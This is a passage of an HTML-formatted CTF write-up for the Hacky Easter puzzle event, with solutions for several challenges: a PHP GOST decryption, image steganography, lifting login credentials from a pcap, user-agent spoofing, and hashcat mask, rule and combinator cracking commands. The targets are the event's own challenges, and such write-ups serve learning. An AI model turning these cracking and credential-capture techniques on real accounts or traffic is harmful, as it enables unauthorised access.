&lt;span class="nv"&gt;$hash1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'d5++xytj6RiGwmqEecm63Kow7RZGAAHh'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nv"&gt;$hash2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'VFsksHFuj/Anap7pWHDZ1XQw8DAApUEN'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nv"&gt;$hash3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'R5ExOGUKTzGOtvSAlCHkHq6NneL6ZUTX'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nv"&gt;$hash4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'ej8Taxz+kHK9w9U8dxTOSksZ4HKS2YYD'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="nv"&gt;$res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mcrypt_decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;MCRYPT_GOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'spooky'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$hash1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$hash2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$hash3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$hash4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;base64_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Running it:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; php ./gost.php &lt;span class="p"&gt;|&lt;/span&gt; base64 -d
&lt;span class="go"&gt;http://hackyeaster.hacking-lab.com/hackyeaster/images/egg_16_a3eIIACKSy02sJ6LxXeh.png&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;No initialisation vector was required, so you can ignore the warning.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-17"&gt;
&lt;h2&gt;Challenge 17&lt;/h2&gt;
&lt;p&gt;There's no real way to spot the difference in the images with your eyes. So the
easiest way is to bring them into Gimp on separate layers. Then I adjusted the top
layer's blend mode to &amp;quot;difference&amp;quot; so that I could see which pixels differ. The image
goes black indicating that there's no differences. Impossible!&lt;/p&gt;
&lt;p&gt;Now thinking that there must be differences I figured that they might be so small
that they appear black. I maxed the contrast and brightness to get:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/0iAoovp.jpg" /&gt;
&lt;p&gt;Now the QR code is in the left eye, and a target shape in the right. The target
needs to be used to invert the pixels in the QR code. Once done, snap the code
and move on.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-18"&gt;
&lt;h2&gt;Challenge 18&lt;/h2&gt;
&lt;p&gt;Once we visit the site we get asked to authenticate. No doubt the details will be in
the pcap file, so let's open that. We can see a failed auth followed by a successful
one. Inspect the relevant packet and we get the login:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/dhLNYS9.png" style="width: 600px;" /&gt;
&lt;p&gt;Using this to login we are presented with another login form. Trying the same
credentials gives a &amp;quot;Payment required&amp;quot; page. Heading back to the pcap file let's
see if we can't find some details for this part too. Ah, right there at the bottom.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/Gp45s1R.png" style="width: 600px;" /&gt;
&lt;p&gt;This time however we need to pass the hash and login details via POST. Either
edit the form, or use a tool like Zap or Burp proxy, to add this data to the POST
and we have our egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-19"&gt;
&lt;h2&gt;Challenge 19&lt;/h2&gt;
&lt;p&gt;Not found.&lt;/p&gt;
&lt;p&gt;I will add a solution here later.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-20"&gt;
&lt;h2&gt;Challenge 20&lt;/h2&gt;
&lt;p&gt;The big clue here is robots. Why do we love robots? &lt;code&gt;robots.txt&lt;/code&gt; is why. Taking a
look at it I can see&lt;/p&gt;
&lt;pre class="code html literal-block"&gt;
User-agent: EasterBot
Disallow: /
Allow: /hackyeaster/bots/bots.

User-agent: *
Disallow: /
&lt;/pre&gt;
&lt;p&gt;Visiting the url &lt;code&gt;/hackyeaster/bots/bots.html&lt;/code&gt; takes me to the CP30 Wiki page. That can't be right. So I decided
to spoof my user agent to be &lt;code&gt;EasterBot&lt;/code&gt; and I get a different result. An image
with the following text&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
BAMA WABOKI PISAL FATATU FOMU WOSEBI SEJU SOWU SEJU - BAMAS MUFE WAFUB FOMU MOWEWE
&lt;/pre&gt;
&lt;p&gt;Hrmm. I tried to decipher this many ways before I gave up and Googled it. It turns
out this is actually &lt;a class="reference external" href="http://roila.org/language-guide/vocabulary/"&gt;ROILA&lt;/a&gt; and
comes with a nice dictionary. So I set about translating it and got:&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
you must make word of addition two and two - this be name of page
&lt;/pre&gt;
&lt;p&gt;Right, so I add two and two to give four and I load up
&lt;code&gt;http://hackyeaster.hacking-lab.com//hackyeaster/bots/four.html&lt;/code&gt; and see Gir with the
word &lt;code&gt;MetAE&lt;/code&gt;. Well meta can only mean I need to look at the page metadata. Viewing the source
I see&lt;/p&gt;
&lt;pre class="code html literal-block"&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;description&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Robots talk in ROILA language: eman egap eht esrever tsum&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;keywords&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;secret, page, robots, fun, hacky easter, blrt, five, beep&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;More ROILA? No, it's just backwards english. I'll just go to
&lt;code&gt;http://hackyeaster.hacking-lab.com//hackyeaster/bots/ruof.html&lt;/code&gt; and get the egg/&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-21"&gt;
&lt;h2&gt;Challenge 21&lt;/h2&gt;
&lt;p&gt;I am told that &lt;code&gt;blue&lt;/code&gt; is &lt;code&gt;110&lt;/code&gt;. I took a guess that therefore red will be &lt;code&gt;011&lt;/code&gt; and
green &lt;code&gt;101&lt;/code&gt;. Basically the binary represents the RGB values inverted. Applying this
I wrote a script to translate the colours to a binary string and then conver that to ASCII
which gave me the egg's URL.&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="ch"&gt;#!/bin/env python&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;PIL&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;

&lt;span class="n"&gt;codes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'111'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'110'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'101'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'100'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'011'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'010'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'001'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'000'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="n"&gt;im&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'conycode.png'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;14.0&lt;/span&gt;
&lt;span class="n"&gt;pixels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getdata&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;

&lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;codes&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;)]])&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="n"&gt;bin_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bin_string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bin_string&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bin_string&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;ba&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytearray&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ba&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-22"&gt;
&lt;h2&gt;Challenge 22&lt;/h2&gt;
&lt;p&gt;Hash cracking. I am new to this, but boy did I enjoy this challenge because I learned
a lot! I decided to use &lt;a class="reference external" href="https://hashcat.net/oclhashcat/"&gt;hashcat&lt;/a&gt; for all the hashes.&lt;/p&gt;
&lt;p&gt;Let's begin:&lt;/p&gt;
&lt;div class="section" id="hash-1"&gt;
&lt;h3&gt;hash 1&lt;/h3&gt;
&lt;p&gt;A 16 digit pin takes a long time to bruteforce, but the hint tells me that the only
numbers in the PIN are 1, 7, 9, and 0.&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
hashcat -m100 -1 1790 --pw-min=16 --pw-max=16 -a3 hash1.txt ?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1
&lt;/pre&gt;
&lt;p&gt;time taken: 4:40 minutes&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="hash-2"&gt;
&lt;h3&gt;hash 2&lt;/h3&gt;
&lt;p&gt;This one had me stumped for ages, because it was hard to bruteforce and hashcat didn't support
sha384. Luckily I found &lt;a class="reference external" href="https://crackstation.net/"&gt;Crackstation&lt;/a&gt; where I entered the hash
and was immediately rewarded with the correct answer. Alternatively writing a brute forcer in Python
and using the Rockyou wordlist would also have worked.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="hash-3"&gt;
&lt;h3&gt;hash 3&lt;/h3&gt;
&lt;p&gt;Here I employed hashcat's &lt;a class="reference external" href="https://hashcat.net/wiki/doku.php?id=rule_based_attack"&gt;rule based attacks&lt;/a&gt;
to make myself a new wordlist based on the given rules.
First I needed to run the &lt;code&gt;toggle&lt;/code&gt; rule to generate the words with one upper case char.
Then I ran a the substituion rule (which is the &lt;code&gt;leetspeak.rule&lt;/code&gt;). Now I had a
list of words that had one substitution and one upper case letter. Only the
punctuation and digit missing now. For this step I wrote a python script
that would generate the required rule table:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="n"&gt;puncs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'! &amp;#64; # $ % ^ &amp;amp; * ( ) _ + { } [ ] : ; . , / ? ~ `'&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;nums&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'1 2 3 4 5 6 7 8 9 0'&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;fh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'pn.rule'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'w'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;punc&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;puncs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;nums&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'$&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;$&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;punc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'$&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;$&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;punc&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I then used this rule to run it over the word list, then&lt;/p&gt;
&lt;p&gt;:code:&lt;tt class="docutils literal"&gt;`
hashcat &lt;span class="pre"&gt;-m0&lt;/span&gt; hash3.txt final.txt
:code:`&lt;/tt&gt;&lt;/p&gt;
&lt;p&gt;to get the plaintext in 3 seconds.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="hash-4"&gt;
&lt;h3&gt;hash 4&lt;/h3&gt;
&lt;p&gt;Here I needed to run hashcat's combinator attack a few times on the word list.
What this does is append each word of a wordlist to every other word.
Running this a few times will give me the list I need:&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
hashcat -a1 wordlist.txt --stdout &amp;gt; pass1.txt
hashcat -a1 -m1400 hash4.txt pass1.txt
&lt;/pre&gt;
&lt;p&gt;Scoop the plaintext in 8 minutes.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-23"&gt;
&lt;h2&gt;Challenge 23&lt;/h2&gt;
&lt;p&gt;Once connected to the server I have to insult the bot quickly and smartly. But who is
smarter than the bot? No one that's who. Except perhaps the bot itself. In essence
what needs to be done is get the taunts from the master and play them back
to him. Then use his replies as respsonses to his taunts.&lt;/p&gt;
&lt;p&gt;I figure there's two ways of doing this;&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Connect the bot to itself via a client that relays the messages between the two&lt;/li&gt;
&lt;li&gt;Record the quips and play them back automatically as needed&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;I plumped for option 2 and hoped there wouldn't be too many quips to harvest. Having
played against the bot a few times I managed to get myself the list of comebacks and
wrote a Python script to pwn the Nerd Master&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;


&lt;span class="n"&gt;challs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;'Pna lbh ernq guvf?'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'EBG13 vf sbe ynzref.'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;You're so slow, you must have been written in BASIC.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;At least I don't have memory leaks like you.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;Go 127.0.0.1 to your mummy.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;go 127.0.0.1 to your mom&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;I have more friends than you.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Yeah, but only until you update your Facebook profile with a real picture of you!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;You should leave your cave and socialize a bit.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;I'm not anti-social. I'm just not user friendly.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;This fight is like a hash function - it works in one direction only.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Too bad you picked LM hashing.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;I bet you don't even understand binary.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Sure I do. Me and you, we are 10 different kind of persons.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;1f u c4n r34d th1s u r s70p1d.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;You better check your spelling. Stoopid has two 'o's.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;After loosing to me, your life won't be the same anymore.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A Life? Cool! Where can I download one of those?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;You'll be 0xdeadbeef soon.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Not as long as I have my 0xcafebabe.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;Af7ter th1s f1gh7, I w1ll pwn ur b0x3n.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Check your settings - you seem to have chosen the Klingon keyboard layout.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;I have more friends than you.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Yeah, but only until you update your Facebook profile with a real picture of you!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
